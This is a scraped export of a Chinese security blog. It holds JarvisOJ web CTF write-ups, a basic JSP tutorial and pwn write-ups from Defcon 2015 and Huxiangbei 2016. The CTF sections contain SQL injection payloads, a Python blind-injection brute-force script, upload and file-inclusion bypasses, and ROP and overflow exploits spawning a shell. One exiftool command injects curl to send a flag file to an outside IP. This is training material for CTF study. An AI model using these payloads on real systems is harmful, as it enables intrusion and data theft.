title=\"Login\"></a>Login</h3><p>查看http头 <code>Hint：&quot;select * from</code>admin<code>where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;</code></p>\n<p><a href=\"http://www.ilrose.com/blog/2015/07/08/md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84sql-%E6%B3%A8%E5%85%A5/\" target=\"_blank\" rel=\"external\">‘“.md5($pass,true).”‘类注入</a></p>\n<h3 id=\"Simple-Injection\"><a href=\"#Simple-Injection\" class=\"headerlink\" title=\"Simple Injection\"></a>Simple Injection</h3><p>首先确定用户名为admin，采用分步验证的方式</p>\n<div class=\"note info\"><p>E.g</p></div>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><div class=\"line\">$sql = <span class=\"string\">\"select password from users where username='$username'\"</span>$result = mysql_query($sql);<span class=\"keyword\">if</span>($result) &#123;</div><div class=\"line\">    $row = mysql_fetch_row($result);</div><div class=\"line\">    $query_password = $row[$password];</div><div class=\"line\">    <span class=\"comment\">//对输入的$password进行变形</span></div><div class=\"line\">    $input_password = modify($passowrd);</div><div class=\"line\">    <span class=\"keyword\">if</span>($input_password == $query_password) &#123;</div><div class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"登陆成功\"</span>;</div><div class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"密码错误\"</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</div><div class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"用户不存在\"</span>;&#125;</div></pre></td></tr></table></figure>\n<p>admin测试发现对#注释符未过滤,使用payload能够被执行 <code>username=a&#39;/**/or/**/1=1#&amp;password=123</code></p>\n<p><img src=\"/CTF/Writeup/JarvisOJ/1.png\" alt=\"1\"></p>\n<p>总结应该是个盲注.查询相关表 列，构造正确sql语句查询password，使用mysql中exists函数</p>\n<p><strong>EXISTS代表存在量词∃。带有EXISTS谓词的子查询不返回任何数据，只产生逻辑真值“true”或者逻辑假值“false”。</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">- username=a'/**/or/**/exists(select/**/*/**/from/**/admin)#&amp;password=123确定有表admin</div><div class=\"line\">- username=a'/**/or/**/exists(select/**/username/**/from/**/admin)#&amp;password=123 username=a'/**/or/**/exists(select/**/password/**/from/**/admin)#&amp;password=123 确定有username，password列</div><div class=\"line\">- username=user'/**/or/**/exists(select/**/count(*)/**/from/**/admin)#&amp;password=123456探测只有一项纪录？？</div><div class=\"line\">- username=1'/**/or/**/(select/**/length(password)/**/from/**/admin)&gt;32#&amp;password=admin密码长度是32位</div></pre></td></tr></table></figure>\n<p>username=a’/<strong>/or/</strong>/……..or前要为错误的，使得or后成立与否会返回不同只，若or前正确</p>\n<p>爆破确定password值</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> requests</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    result = <span class=\"string\">\"\"</span></div><div class=\"line\">    url = <span class=\"string\">'http://web.jarvisoj.com:32787/login.php'</span></div><div class=\"line\">    payload = &#123;</div><div class=\"line\">        <span class=\"string\">\"username\"</span>:<span class=\"string\">'xx'</span>,</div><div class=\"line\">        <span class=\"string\">\"password\"</span>:<span class=\"number\">1</span>,</div><div class=\"line\">    &#125;</div><div class=\"line\">    username_template = <span class=\"string\">\"'/**/or/**/ascii(substr((select/**/password/**/from/**/admin),&#123;0&#125;,1))&gt;&#123;1&#125;#\"</span></div><div class=\"line\">    chars = <span class=\"string\">'0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'</span></div><div class=\"line\">    <span class=\"keyword\">for</span> i  <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">33</span>):</div><div class=\"line\">        <span class=\"keyword\">for</span> char <span class=\"keyword\">in</span> chars:</div><div class=\"line\">            char_ascii = ord(char)</div><div class=\"line\">            username = username_template.format(i,char_ascii)     <span class=\"comment\">#format格式化字符串，i代替username_template中&#123;0&#125;，char_ascii代替&#123;1&#125;</span></div><div class=\"line\">            payload[<span class=\"string\">'username'</span>] = username</div><div class=\"line\">            response = requests.post(url,data=payload)</div><div class=\"line\">            length = len(response.text)</div><div class=\"line\">            <span class=\"comment\"># print(length)</span></div><div class=\"line\">            <span class=\"comment\">#返回的长度只有1191和1192</span></div><div class=\"line\">            <span class=\"keyword\">if</span> length&gt;<span class=\"number\">1191</span>:</div><div class=\"line\">                print(char)</div><div class=\"line\">                result += char</div><div class=\"line\">                <span class=\"keyword\">break</span></div><div class=\"line\">    print(result)</div><div class=\"line\"></div><div class=\"line\">get_data()</div></pre></td></tr></table></figure>\n<p>得到passowrd <code>334cfb59c9d74849801d5acdcfdaadc3</code>,结合以上猜测，此数值应为md5加密后的数值,构造payload如下</p>\n<p><code>username=user&#39;/**/union/**/select/**/&#39;c4ca4238a0b923820dcc509a6f75849b&#39;#&amp;password=1</code></p>\n<p>c4ca4238a0b923820dcc509a6f75849b为1的md5值</p>\n<h3 id=\"Please-use-port-51-to-visit-this-site\"><a href=\"#Please-use-port-51-to-visit-this-site\" class=\"headerlink\" title=\"Please use port 51 to visit this site.\"></a>Please use port 51 to visit this site.</h3><p>需要在vps上执行，网络端口转发问题，端口在经过路由之后会改变</p>\n<h3 id=\"In-a-mess\"><a href=\"#In-a-mess\" class=\"headerlink\" title=\"In a mess\"></a>In a mess</h3><p>右键查看源码得到hint</p>\n<p><code>&lt;!--index.phps--&gt;work harder!harder!harder!</code></p>\n<p>查看index.phps得到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">if</span>(!$_GET[<span class=\"string\">'id'</span>]) &#123; header(<span class=\"string\">'Location: index.php?id=1'</span>); <span class=\"keyword\">exit</span>(); &#125;</div><div class=\"line\">$id=$_GET[<span class=\"string\">'id'</span>];</div><div class=\"line\">$a=$_GET[<span class=\"string\">'a'</span>];</div><div class=\"line\">$b=$_GET[<span class=\"string\">'b'</span>];</div><div class=\"line\"><span class=\"keyword\">if</span>(stripos($a,<span class=\"string\">'.'</span>)) &#123; <span class=\"keyword\">echo</span> <span class=\"string\">'Hahahahahaha'</span>; <span class=\"keyword\">return</span> ; &#125;</div><div class=\"line\">$data = @file_get_contents($a,<span class=\"string\">'r'</span>);</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span>($data==<span class=\"string\">\"1112 is a nice lab!\"</span> <span class=\"keyword\">and</span> $id==<span class=\"number\">0</span> <span class=\"keyword\">and</span> strlen($b)&gt;<span class=\"number\">5</span> <span class=\"keyword\">and</span> eregi(<span class=\"string\">\"111\"</span>.substr($b,<span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"string\">\"1114\"</span>) <span class=\"keyword\">and</span> substr($b,<span class=\"number\">0</span>,<span class=\"number\">1</span>)!=<span class=\"number\">4</span>)</div><div class=\"line\">&#123; <span class=\"keyword\">require</span>(<span class=\"string\">\"flag.txt\"</span>); &#125;</div><div class=\"line\"><span class=\"comment\">//eregi — 不区分大小写的正则表达式匹配</span></div><div class=\"line\"><span class=\"comment\">//substr(string,start,length)返回字符串的一部分。</span></div><div class=\"line\"><span class=\"comment\">//\"111\". 字符串叠加</span></div><div class=\"line\"><span class=\"keyword\">else</span> &#123; <span class=\"keyword\">print</span> <span class=\"string\">\"work harder!harder!harder!\"</span>; &#125; </div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure>\n<ul>\n<li>id <a href=\"http://www.phpchina.com/portal.php?mod=view&amp;aid=40031\" target=\"_blank\" rel=\"external\">php弱类型比较</a></li>\n<li>a 获取的文件中内容为制定内容<ul>\n<li>通过伪协议 输出流绕过 php://</li>\n<li>通过自己vps上搭建内容 <a href=\"http://www.miniwebtool.com/ip-address-to-hex-converter/\" target=\"_blank\" rel=\"external\">ip地址转化为十六进制</a></li>\n</ul>\n</li>\n<li>b eregi遇到%00就终止 *也可以</li>\n</ul>\n<p>下一关</p>\n<p><code>&lt;!--index.phps--&gt;Come ON!!! {/^HT2mCpcvOLf}</code></p>\n<p>得到注入点 空格 /<em>1</em>/绕过 双写绕过</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">-  /%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,3# 3可控制</div><div class=\"line\">- /%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,database()# 库名tset</div><div class=\"line\">- /%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(table_name)/*8*/frfromom/*8*/information_schema.tables/*8*/where/*8*/table_schema=database()#   表名content</div><div class=\"line\">    - information_schema库 保存了MySQL服务器所有数据库的信息</div><div class=\"line\">- /%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*8*/frfromom/*8*/information_schema.columns/*8*/where/*8*/table_name=0x636f6e74656e74 获得列名id,context,title</div><div class=\"line\">\t- table_name= content的十六进制</div></pre></td></tr></table></figure>\n<div class=\"note success\"><p>payload:</p></div>\n<p><code>/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(context,-,title)/*8*/frfromom/*8*/content</code></p>\n<h3 id=\"Easy-Gallery\"><a href=\"#Easy-Gallery\" class=\"headerlink\" title=\"Easy Gallery\"></a>Easy Gallery</h3><ul>\n<li>图片上传采用图片马绕过，应该是对文件后缀及文件头的监测</li>\n<li>index?page= 文件包含漏洞，服务端会自动加上php采用%00截断绕过</li>\n<li>图片码中采用<script language=\"”PHP”\"></script>绕过</li>\n</ul>\n<h3 id=\"Phpinfo\"><a href=\"#Phpinfo\" class=\"headerlink\" title=\"Phpinfo\"></a>Phpinfo</h3><p>参考：</p>\n<ul>\n<li><a href=\"http://blog.spoock.com/2016/10/16/php-serialize-problem/\" target=\"_blank\" rel=\"external\">http://blog.spoock.com/2016/10/16/php-serialize-problem/</a></li>\n<li><a href=\"http://www.math1as.com/index.php/archives/227/\" target=\"_blank\" rel=\"external\">http://www.math1as.com/index.php/archives/227/</a></li>\n<li><a href=\"http://blog.csdn.net/qq_31481187/article/details/53189113\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/qq_31481187/article/details/53189113</a></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\"><span class=\"comment\">//A webshell is wait for you</span></div><div class=\"line\">ini_set(<span class=\"string\">'session.serialize_handler'</span>, <span class=\"string\">'php'</span>);     <span class=\"comment\">//是指序列化引擎</span></div><div class=\"line\">session_start();</div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">OowoO</span></span></div><div class=\"line\"><span class=\"class\"></span>&#123;</div><div class=\"line\">    <span class=\"keyword\">public</span> $mdzz;</div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">()</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;mdzz = <span class=\"string\">'phpinfo();'</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"keyword\">$this</span>-&gt;mdzz);</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'phpinfo'</span>]))</div><div class=\"line\">&#123;</div><div class=\"line\">    $m = <span class=\"keyword\">new</span> OowoO();</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"keyword\">else</span></div><div class=\"line\">&#123;</div><div class=\"line\">    highlight_string(file_get_contents(<span class=\"string\">'index.php'</span>));</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"meta\">?&gt;</span></div></pre></td></tr></table></figure>\n<p>通过传入phpinfo,<code>$flag=&quot;CTF{4d96e37f4be998c50aa586de4ada354a}&quot;;</code></p>\n<h3 id=\"图片上传\"><a href=\"#图片上传\" class=\"headerlink\" title=\"图片上传\"></a>图片上传</h3><ul>\n<li><a href=\"http://www.evil0x.com/posts/22405.html\" target=\"_blank\" rel=\"external\">http://www.evil0x.com/posts/22405.html</a></li>\n<li><a href=\"http://weibo.com/p/1001603971443670055277\" target=\"_blank\" rel=\"external\">http://weibo.com/p/1001603971443670055277</a></li>\n<li><a href=\"http://m.duxuan.cn\" target=\"_blank\" rel=\"external\">http://m.duxuan.cn</a>  /doc/6320491.html</li>\n</ul>\n<p>通过exiftool注入label标签给一张正常的png</p>\n<p><code>./exiftool-label=&quot;\\&quot;|curl 106.187.45.41:9999 -F  &#39;file=@/home/ctf/flag.txt&#39;; \\&quot;&quot; 2.png -o t.png</code></p>\n<p>上传图片后获得的文件名</p>\n<p><code>POST /upload.php?path=/tmp/&amp;filesize=100&amp;filetype=show&amp;image=1486821802.png</code></p>\n<p>返回包中出现笑脸表示命令执行成功</p>\n<p><code>Upload: t.png&lt;br /&gt;Size: 6.5146484375 Kb&lt;br /&gt;Temp file: /opt/lampp/temp/phpx4sZjk&lt;br /&gt;Stored in: uploads/1486821831.png:)</code></p>\n<p>PS:</p>\n<ul>\n<li>命令如果执行失败会返回哭脸。nc都失败</li>\n</ul>\n<p><code>Upload: t.png&lt;br /&gt;Size: 0.26953125 Kb&lt;br /&gt;Temp file: /opt/lampp/temp/phpbDp7YG&lt;br /&gt;Stored in: uploads/1486823617.png:)</code></p>\n<h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><p>TODO</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"http://veritas501.space/2017/03/10/JarvisOJ_WP/\" target=\"_blank\" rel=\"external\">veritas501</a><br><a href=\"http://www.hexocode.com/shell/2017/08/24/28444.html\" target=\"_blank\" rel=\"external\">Jarvisojpwnwriteup</a></p>\n","categories":["CTF","Writeup"],"tags":["Web","Pwn"]},{"title":"JavaWeb:JSP","url":"https://xuccc.github.io/Language/Java/JavaWeb/","content":"<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><p>JSP全称是Java Server Pages，SUN公司定义的一种用于开发动态web资源的技术。访问JSP时服务器将其翻译为一个Servlet，其中的Java被_jspService处理</p>\n<p>Tomcat执行过程：</p>\n<p><img src=\"/Language/Java/JavaWeb/1.jpg\" alt=\"1\"></p>\n<h2 id=\"基础语法\"><a href=\"#基础语法\" class=\"headerlink\" title=\"基础语法\"></a>基础语法</h2><h3 id=\"JSP模板元素\"><a href=\"#JSP模板元素\" class=\"headerlink\" title=\"JSP模板元素\"></a>JSP模板元素</h3><p>指JSP中的HTML内容，其定义了网页的结构和外观</p>\n<h3 id=\"JSP表达式\"><a href=\"#JSP表达式\" class=\"headerlink\" title=\"JSP表达式\"></a>JSP表达式</h3><p>用于输出到到客户端</p>\n<div class=\"note info\"><p>语法</p></div>\n<figure class=\"highlight jsp\"><table><tr><td class=\"code\"><pre><div class=\"line\">&lt;%= 变量或表达式 %&gt;</div></pre></td></tr></table></figure>\n<p>JSP脚本表达式中的变量或表达式后面不能有分号</p>\n<h3 id=\"JSP脚本片段\"><a href=\"#JSP脚本片段\" class=\"headerlink\" title=\"JSP脚本片段\"></a>JSP脚本片段</h3><p>编写多行的Java代码</p>\n<div class=\"note info\"><p>语法</p></div>\n<figure class=\"highlight jsp\"><table><tr><td class=\"code\"><pre><div class=\"line\">&lt;%</div><div class=\"line\">\tJava;</div><div class=\"line\">\tJava;</div><div class=\"line\">%&gt;</div></pre></td></tr></table></figure>\n<h3 id=\"JSP声明\"><a href=\"#JSP声明\" class=\"headerlink\" title=\"JSP声明\"></a>JSP声明</h3><p>JSP页面中编写的所有代码，默认会翻译到servlet的service方法中，而Jsp声明中的java代码被翻译到_jspService方法的外面。用于定义JSP转换成Servlet中的静态代码块，成员变量等</p>\n<div class=\"note info\"><p>语法</p></div>\n<figure class=\"highlight jsp\"><table><tr><td class=\"code\"><pre><div class=\"line\">&lt;%!</div><div class=\"line\">\tJava;</div><div class=\"line\">%&gt;</div><div class=\"line\"></div><div class=\"line\">### JSP注释</div><div class=\"line\"></div><div class=\"line\">&#123;% note info%&#125;</div><div class=\"line\">语法</div><div class=\"line\">&#123;% endnote %&#125;</div><div class=\"line\"></div><div class=\"line\">```jsp</div><div class=\"line\"></div><div class=\"line\">&lt;!--可见注释--&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;%</div><div class=\"line\">\t<span class=\"comment\">//Java</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">/*</span></div><div class=\"line\"><span class=\"comment\">\tJava</span></div><div class=\"line\"><span class=\"comment\">\t*/</span></div><div class=\"line\">%&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;%--JSP--%&gt;</div></pre></td></tr></table></figure>\n<h2 id=\"指令-directive\"><a href=\"#指令-directive\" class=\"headerlink\" title=\"指令(directive)\"></a>指令(directive)</h2><p>目的告诉引擎如何处理JSP页面，总共有三种：</p>\n<ul>\n<li>page</li>\n<li>include</li>\n<li>taglib</li>\n</ul>\n<div class=\"note info\"><p>语法</p></div>\n<figure class=\"highlight jsp\"><table><tr><td class=\"code\"><pre><div class=\"line\">&lt;%@ 指令 属性=<span class=\"string\">\"value\"</span> %&gt;</div></pre></td></tr></table></figure>\n<div class=\"note success\"><p>E.g</p></div>\n<figure class=\"highlight jsp\"><table><tr><td class=\"code\"><pre><div class=\"line\">&lt;%@ page contentType=<span class=\"string\">\"text/html;charset=gb2312\"</span>%&gt;</div><div class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">\"java.util.Date\"</span>%&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;%@ page contentType=<span class=\"string\">\"text/html;charset=gb2312\"</span> <span class=\"keyword\">import</span>=<span class=\"string\">\"java.util.Date\"</span>%&gt;</div></pre></td></tr></table></figure>\n<h3 id=\"page\"><a href=\"#page\" class=\"headerlink\" title=\"page\"></a>page</h3><p>定义整个页面各种属性</p>\n<div class=\"note success\"><p>E.g</p></div>\n<figure class=\"highlight jsp\"><table><tr><td class=\"code\"><pre><div class=\"line\">&lt;%@ page language=<span class=\"string\">\"java\"</span> contentType=<span class=\"string\">\"text/html; charset=UTF-8\"</span> pageEncoding=<span class=\"string\">\"UTF-8\"</span>%&gt;</div></pre></td></tr></table></figure>\n<h4 id=\"errorPage\"><a href=\"#errorPage\" class=\"headerlink\" title=\"errorPage\"></a>errorPage</h4><ul>\n<li>errorPage属性的设置值必须使用相对路径，如果以“/”开头，表示相对于当前Web应用程序的根目录(注意不是站点根目录)，否则，表示相对于当前页面</li>\n<li>可以在web.xml文件中使用<error-page>元素为整个Web应用程序设置错误处理页面。</error-page></li>\n<li><error-page>元素有3个子元素，<code>&lt;error-code&gt;、&lt;exception-type&gt;、&lt;location&gt;</code></error-page></li>\n<li><error-code>子元素指定错误的状态码，例如： <code>&lt;error-code&gt;404&lt;/error-code&gt;</code></error-code></li>\n<li><exception-type>子元素指定异常类的完全限定名，例如：<code>&lt;exception-type&gt;java.lang.ArithmeticException&lt;/exception-type&gt;</code></exception-type></li>\n<li><location>子元素指定以“/”开头的错误处理页面的路径，例如：<code>&lt;location&gt;/ErrorPage/404Error.jsp&lt;/location&gt;</code></location></li>\n<li>如果设置了某个JSP页面的errorPage属性，那么在web.xml文件中设置的错误处理将不对该页面起作用</li>\n</ul>\n<h5 id=\"web-xml使用-lt-error-page-gt\"><a href=\"#web-xml使用-lt-error-page-gt\" class=\"headerlink\" title=\"web.xml使用&lt;error-page&gt;\"></a>web.xml使用<code>&lt;error-page&gt;</code></h5><div class=\"note success\"><p>E.g</p></div>\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><div class=\"line\">&lt;error-page&gt;</div><div class=\"line\">  &lt;error-code&gt;404&lt;/error-code&gt;</div><div class=\"line\">  &lt;location&gt;/showinfo?err=404&lt;/location&gt;</div><div class=\"line\">&lt;/error-page&gt;</div><div class=\"line\">&lt;error-page&gt;</div><div class=\"line\">  &lt;error-code&gt;400&lt;/error-code&gt;</div><div class=\"line\">  &lt;location&gt;/showinfo?err=400&lt;/location&gt;</div><div class=\"line\">&lt;/error-page&gt;</div></pre></td></tr></table></figure>\n<p>page指令的<code>isErrorPage</code>属性可以声明改页面为错误处理页面</p>\n<h3 id=\"include\"><a href=\"#include\" class=\"headerlink\" title=\"include\"></a>include</h3><div class=\"note info\"><p>语法</p></div>\n<figure class=\"highlight jsp\"><table><tr><td class=\"code\"><pre><div class=\"line\">&lt;%@ include file=<span class=\"string\">\"xxx\"</span>%&gt;</div><div class=\"line\">jsp:include</div></pre></td></tr></table></figure>\n<h2 id=\"文章参考\"><a href=\"#文章参考\" class=\"headerlink\" title=\"文章参考:\"></a>文章参考:</h2><p><a href=\"http://www.cnblogs.com/xdp-gacl/tag/JavaWeb%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/\" target=\"_blank\" rel=\"external\">JavaWeb学习路线</a></p>\n","categories":["Language","Java"],"tags":["Web","Java"]},{"title":"OJ","url":"https://xuccc.github.io/uncategorized/OJ/","content":"<h1 id=\"TODO\"><a href=\"#TODO\" class=\"headerlink\" title=\"TODO\"></a>TODO</h1>","categories":[],"tags":[]},{"title":"RoutineTraining Pwn","url":"https://xuccc.github.io/CTF/Writeup/RoutineTraining-Pwn/","content":"<h2 id=\"Defcon-2015-Qualifier\"><a href=\"#Defcon-2015-Qualifier\" class=\"headerlink\" title=\"Defcon 2015 Qualifier\"></a>Defcon 2015 Qualifier</h2><h3 id=\"R0pbaby\"><a href=\"#R0pbaby\" class=\"headerlink\" title=\"R0pbaby\"></a>R0pbaby</h3><p>Vuln Points:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\">__<span class=\"function\">int64 <span class=\"title\">sub_C46</span><span class=\"params\">()</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  <span class=\"keyword\">signed</span> <span class=\"keyword\">int</span> v0; <span class=\"comment\">// eax@4</span></div><div class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v1; <span class=\"comment\">// r14@15</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v2; <span class=\"comment\">// er13@17</span></div><div class=\"line\">  <span class=\"keyword\">size_t</span> v3; <span class=\"comment\">// r12@17</span></div><div class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// eax@18</span></div><div class=\"line\">  <span class=\"keyword\">void</span> *handle; <span class=\"comment\">// [sp+8h] [bp-448h]@1</span></div><div class=\"line\">  <span class=\"keyword\">char</span> nptr[<span class=\"number\">1088</span>]; <span class=\"comment\">// [sp+10h] [bp-440h]@2</span></div><div class=\"line\">  __int64 savedregs; <span class=\"comment\">// [sp+450h] [bp+0h]@22</span></div><div class=\"line\">...</div><div class=\"line\">...</div><div class=\"line\">        <span class=\"keyword\">if</span> ( v1 )</div><div class=\"line\">        &#123;</div><div class=\"line\">          v2 = <span class=\"number\">0</span>;</div><div class=\"line\">          v3 = <span class=\"number\">0L</span>L;</div><div class=\"line\">          <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</div><div class=\"line\">          &#123;</div><div class=\"line\">            v4 = _IO_getc(<span class=\"built_in\">stdin</span>);</div><div class=\"line\">            <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">-1</span> )</div><div class=\"line\">              <span class=\"keyword\">break</span>;</div><div class=\"line\">            nptr[v3] = v4;</div><div class=\"line\">            ++v2;</div><div class=\"line\">            v3 = v2;</div><div class=\"line\">            <span class=\"keyword\">if</span> ( v1 &lt;= v2 )</div><div class=\"line\">              <span class=\"keyword\">goto</span> LABEL_22;</div><div class=\"line\">          &#125;</div><div class=\"line\">          v3 = v2 + <span class=\"number\">1</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">else</span></div><div class=\"line\">        &#123;</div><div class=\"line\">          v3 = <span class=\"number\">0L</span>L;</div><div class=\"line\">        &#125;</div><div class=\"line\">LABEL_22:</div><div class=\"line\">        <span class=\"built_in\">memcpy</span>(&amp;savedregs, nptr, v3);</div><div class=\"line\">      &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">...</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>Exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getsymbol</span><span class=\"params\">(symbol)</span>:</span></div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'4) Exit\\n:'</span>)</div><div class=\"line\">\tio.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">\tio.recvuntil(<span class=\"string\">'Enter symbol:'</span>)</div><div class=\"line\">\tio.sendline(symbol)</div><div class=\"line\">\tdata = io.recvline()</div><div class=\"line\">\tdata = data[data.find(<span class=\"string\">'0x'</span>):<span class=\"number\">-1</span>]</div><div class=\"line\">\tdata = long(data,<span class=\"number\">16</span>)</div><div class=\"line\">\t<span class=\"keyword\">return</span> data</div><div class=\"line\"></div><div class=\"line\">popreiOffset = <span class=\"number\">0x000000000001fc3a</span></div><div class=\"line\">systemOffset = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\">log.info(<span class=\"string\">'system offset:'</span> + str(systemOffset))</div><div class=\"line\">binshoffset = libc.search(<span class=\"string\">'/bin/sh'</span>).next()</div><div class=\"line\">log.info(<span class=\"string\">'binsh offset:'</span> + str(binshoffset))</div><div class=\"line\"></div><div class=\"line\">systemAddress = getsymbol(<span class=\"string\">'system'</span>)</div><div class=\"line\">libcbase = systemAddress - systemOffset</div><div class=\"line\">log.info(<span class=\"string\">'libcbase:'</span> + hex(libcbase))</div><div class=\"line\">binshAddress = libcbase + binshoffset</div><div class=\"line\">log.info(<span class=\"string\">'binshAddress:'</span> + hex(binshAddress))</div><div class=\"line\">popreiAddress = libcbase + popreiOffset</div><div class=\"line\">log.info(<span class=\"string\">\"poprdiAddress: \"</span> + hex(popreiAddress))</div><div class=\"line\"></div><div class=\"line\">io.recvuntil(<span class=\"string\">'4) Exit\\n:'</span>)</div><div class=\"line\">io.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">io.recvuntil(<span class=\"string\">'Enter bytes to send (max 1024):'</span>)</div><div class=\"line\">io.sendline(<span class=\"string\">'50'</span>)</div><div class=\"line\"></div><div class=\"line\">raw_input()</div><div class=\"line\"></div><div class=\"line\">payload = <span class=\"string\">'A'</span> * <span class=\"number\">8</span> + p64(popreiAddress) + p64(binshAddress) + p64(systemAddress) + <span class=\"string\">'ABCDABCD'</span></div><div class=\"line\">io.sendline(payload)</div><div class=\"line\">io.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"湖湘杯-2016\"><a href=\"#湖湘杯-2016\" class=\"headerlink\" title=\"湖湘杯 2016\"></a>湖湘杯 2016</h2><h3 id=\"Pwnme200\"><a href=\"#Pwnme200\" class=\"headerlink\" title=\"Pwnme200\"></a>Pwnme200</h3><p>Vuln Points:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getfruit</span><span class=\"params\">()</span></span></div><div class=\"line\"><span class=\"function\"></span>&#123;</div><div class=\"line\">  <span class=\"keyword\">char</span> v1; <span class=\"comment\">// [sp+14h] [bp-A4h]@1</span></div><div class=\"line\"></div><div class=\"line\">  fflush(<span class=\"built_in\">stdout</span>);</div><div class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Please input the name of fruit:\"</span>);</div><div class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%s\"</span>, &amp;v1);</div><div class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">\"oh,%s...\\n\"</span>, &amp;v1);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>Exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\">getflagAddress = binary.symbols[<span class=\"string\">'getflag'</span>]</div><div class=\"line\"></div><div class=\"line\">io.recvuntil(<span class=\"string\">'&gt;&gt; 6. Exit'</span>)</div><div class=\"line\">io.sendline(<span class=\"string\">'5'</span>)</div><div class=\"line\">io.recvuntil(<span class=\"string\">'Please input the name of fruit:'</span>)</div><div class=\"line\"></div><div class=\"line\">payload = <span class=\"string\">'A'</span> * <span class=\"number\">168</span> + p32(getflagAddress) + <span class=\"string\">'ABCD'</span></div><div class=\"line\">io.sendline(payload)</div><div class=\"line\"><span class=\"keyword\">print</span> io.recvall()</div></pre></td></tr></table></figure>\n","categories":["CTF","Writeup"],"tags":["Pwn"]},{"title":"Nebula","url":"https://xuccc.github.io/CTF/Writeup/Nebula/","content":"<h1 id=\"Nebula-Writeup\"><a href=\"#Nebula-Writeup\" class=\"headerlink\" 